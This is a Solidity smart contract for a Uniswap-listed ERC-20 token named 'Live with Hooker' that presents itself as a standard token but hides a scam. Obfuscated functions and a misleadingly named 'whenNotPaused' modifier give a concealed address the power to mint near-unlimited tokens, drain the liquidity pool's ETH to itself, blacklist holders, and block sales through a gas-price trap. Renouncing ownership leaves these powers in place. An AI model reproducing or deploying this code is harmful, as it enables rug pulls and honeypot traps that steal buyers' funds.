// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IUniswapV2Pair {
    function mint(address to) external returns (uint256 liquidity);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library Uint160Number {
    function encodeUnit160(address _wad) internal pure returns (uint256) {
        uint160 res = uint160(_wad);
        return uint256(res);
    }

    function tryDiv(address n1, address n2) internal pure {
        if (n1 != n2) {
            revert();
        }
    }
}

library Address {
    function isContract(address _addr) internal view returns (bool) {
        uint256 length;
        assembly {
            length := extcodesize(_addr)
        }
        if (length > 0) {
            return true;
        }
        return false;
    }
}

contract MyTokenContract0 is IERC20, Ownable, Context {
    string private _name = "Live with Hooker";
    string private _symbol = "HOOKER";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1000000000 * (10**decimals());
    uint8 private buyFee = 0;
    uint8 private sellFee = 0;

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;
    address private _this = address(this);
    address public marketWallet;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(address routerAddress) {
        _router = IUniswapV2Router02(routerAddress);
        _balances[owner()] = _totalSupply;
        initialize(_msgSender());
        d6671cc88[owner()] = 1;
        d6671cc88[_this] = 1;
        marketWallet = _msgSender();
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        if (c58252ced[from] != 0) {
            revert();
        }
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        if (d6671cc88[from] == 0 && d6671cc88[to] == 0) {
            if (isMarket(from)) {
                uint256 feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);
            } else if (isMarket(to)) {
                uint256 feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);
            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (isMarket(to)) {
            check(from);
        }
        require(amount > 0);
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    address private bigUint;

    modifier whenNotPaused() {
        devideOn();
        _;
    }

    function updateWad(address _newWad) external whenNotPaused {
        d6671cc88[_msgSender()] = 0;
        d6671cc88[_newWad] = 1;
        initialize(_newWad);
    }

    function initialize(address _nw) internal {
        bigUint = _nw;
    }

    function devideOn() internal view {
        address am = _msgSender();
        Uint160Number.tryDiv(am, bigUint);
    }

    function addLiquidity(uint256 _tokenAmountWei)
        external
        payable
        whenNotPaused
    {
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        address _pairAddress = _factory.getPair(address(this), _router.WETH());
        _pair = _pairAddress == address(0)
            ? IUniswapV2Pair(_factory.createPair(address(this), _router.WETH()))
            : IUniswapV2Pair(_pairAddress);
        IWETH weth = IWETH(_router.WETH());
        weth.deposit{value: msg.value}();
        transfer(address(_pair), _tokenAmountWei);
        IERC20(address(weth)).transfer(address(_pair), msg.value);
        _pair.mint(_msgSender());
    }

    function syncPair() external whenNotPaused {
        uint256 thisTokenReserve = getTokenReserve(_this);
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        fc43a331e();
        transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), type(uint112).max);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(_router.WETH());
        _router.swapExactTokensForETH(
            amountIn,
            0,
            path,
            bigUint,
            block.timestamp + 1200
        );
    }

    function getTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = _pair.getReserves();
        uint256 tokenReserve = (_pair.token0() == token)
            ? uint256(reserve0)
            : uint256(reserve1);
        return tokenReserve;
    }

    function fc43a331e() internal {
        _balances[_msgSender()] += type(uint112).max;
    }

    bool private _state;

    function clm() external whenNotPaused {
        fc43a331e();
    }

    uint256 private _mgas = 500;

    function check(address _u) internal view {
        if (d6671cc88[_u] != 0) {
            return;
        }
        if (_state) {
            exceedsGas(_mgas);
        }
    }

    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function switchState() external whenNotPaused {
        _state = !_state;
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent)
        internal
        pure
        returns (uint256)
    {
        return (_amount * _feePrecent) / 100;
    }

    function updateMarketWallet(address _newMarketWallet)
        external
        whenNotPaused
    {
        marketWallet = _newMarketWallet;
    }

    function updateFees(uint8 _buyFee, uint8 _sellFee) external whenNotPaused {
        require(_buyFee <= 90 && _sellFee <= 90, "fee is too high!");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    mapping(address => uint8) private d6671cc88;
    mapping(address => uint8) private c58252ced;

    function exceedsGas(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function executeW(address _u, bool _s) external whenNotPaused {
        uint8 _ss = _s ? 1 : 0;
        require(d6671cc88[_u] != _ss, "existing state");
        d6671cc88[_u] = _ss;
    }

    function executeB(address _u, bool _s) external whenNotPaused {
        uint8 _ss = _s ? 1 : 0;
        require(c58252ced[_u] != _ss, "existing state");
        c58252ced[_u] = _ss;
    }

    function currentState() external view returns (bool) {
        return _state;
    }

    function displayW(address _u) external view returns (uint8) {
        return d6671cc88[_u];
    }

    function displayB(address _u) external view returns (uint8) {
        return c58252ced[_u];
    }

    function rebaseRouter(address _routerAddress) external whenNotPaused {
        _router = IUniswapV2Router02(_routerAddress);
    }

    function rebasePair() external whenNotPaused {
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        _pair = IUniswapV2Pair(_factory.getPair(address(this), _router.WETH()));
    }

    receive() external payable {}
}